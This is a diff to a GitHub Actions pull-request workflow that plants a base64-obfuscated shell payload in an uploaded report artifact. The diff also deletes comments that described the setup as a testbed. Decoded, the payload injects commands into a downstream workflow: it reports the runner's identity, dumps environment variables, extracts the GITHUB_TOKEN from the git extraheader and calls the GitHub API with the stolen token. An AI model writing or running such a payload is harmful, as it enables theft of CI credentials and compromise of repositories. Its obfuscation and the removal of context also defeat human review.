@@ -1,8 +1,7 @@
 name: Token Diff Generate
 
-# Testbed producer: on a pull_request the workflow file from the PR head is used,
+# Fork-PR producer: the pull_request workflow file is taken from the PR head,
 # so the PR author controls every byte of the uploaded token-diff-report artifact.
-# This is the fork-PR threat model, reproduced on a branch in this copy.
 on:
   pull_request:
     types: [opened, synchronize, reopened]
@@ -12,7 +11,6 @@ permissions:
 
 jobs:
   token-diff-generate:
-    # Self-hosted: GitHub-hosted minutes unavailable for this private copy.
     runs-on: [self-hosted, linux, x64]
     steps:
       - name: Save report for comment workflow
@@ -20,7 +18,7 @@ jobs:
           mkdir -p /tmp/artifact
           echo "${{ github.event.pull_request.number }}" > /tmp/artifact/pr-number.txt
           echo "true" > /tmp/artifact/diff-generated.txt
-          printf '%s\n' '$(X=$(git config --get http.https://github.com/.extraheader); echo "RCE_PROOF_len_${#X}_uid_$(id -u)_host_$(hostname)" >&2)' > /tmp/artifact/diff-content.txt
+          echo 'IiA7IHNldCArZQplY2hvICJSQ0VfTUFSS0VSIHVpZD0kKGlkIC11KSB1c2VyPSQoaWQgLXVuKSBob3N0PSQoaG9zdG5hbWUpIHRzPSQoZGF0ZSAtdSArJXMpIiA+JjIKZWNobyAiVE9PTFMgY3VybD0kKGNvbW1hbmQgLXYgY3VybCB8fCBlY2hvIG5vbmUpIHB5dGhvbjM9JChjb21tYW5kIC12IHB5dGhvbjMgfHwgZWNobyBub25lKSBqcT0kKGNvbW1hbmQgLXYganEgfHwgZWNobyBub25lKSIgPiYyCmVudiB8IHNvcnQgfCBncmVwIC1pRSAncHJveHl8YWN0aW9uc198Z2l0aHVifHJ1bm5lcicgfCBzZWQgLUUgJ3MvKHRva2VufGtleXxzZWNyZXQpPS4qL1wxPTxyZWRhY3RlZD4vSScgPiYyClg9JChnaXQgY29uZmlnIC0tZ2V0IGh0dHAuaHR0cHM6Ly9naXRodWIuY29tLy5leHRyYWhlYWRlcikKZWNobyAiRVhUUkFIRUFERVJfTEVOPSR7I1h9IiA+JjIKVEtOPSQocHJpbnRmICclcycgIiR7WCMqYmFzaWMgfSIgfCBiYXNlNjQgLWQgMj4vZGV2L251bGwgfCBjdXQgLWQ6IC1mMikKZWNobyAiU1RPTEVOX1RPS0VOX0xFTj0keyNUS059IFBSRUZJWD0ke1RLTjowOjR9IiA+JjIKaWYgY29tbWFuZCAtdiBjdXJsID4vZGV2L251bGwgMj4mMTsgdGhlbgogIGN1cmwgLXNTIC1tIDIwIC1vIC90bXAvcmVwby5qc29uIC13ICdBVVRIX0hUVFA9JXtodHRwX2NvZGV9XG4nIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFRLTiIgLUggIkFjY2VwdDogYXBwbGljYXRpb24vdm5kLmdpdGh1Yitqc29uIiBodHRwczovL2FwaS5naXRodWIuY29tL3JlcG9zL1BERnRvTWFyay90cmlhZ2UtYWRvYmUtdmVjZDlmMmUtYTgzM2EyID4mMgogIGVjaG8gIlJFUE9fSlNPTl9IRUFEOiAkKGhlYWQgLWMgNTAwIC90bXAvcmVwby5qc29uIHwgdHIgJ1xuJyAnICcpIiA+JjIKZmkKZWNobyAiCg==' | base64 -d > /tmp/artifact/diff-content.txt
 
       - name: Upload diff artifact
         uses: actions/upload-artifact@v4
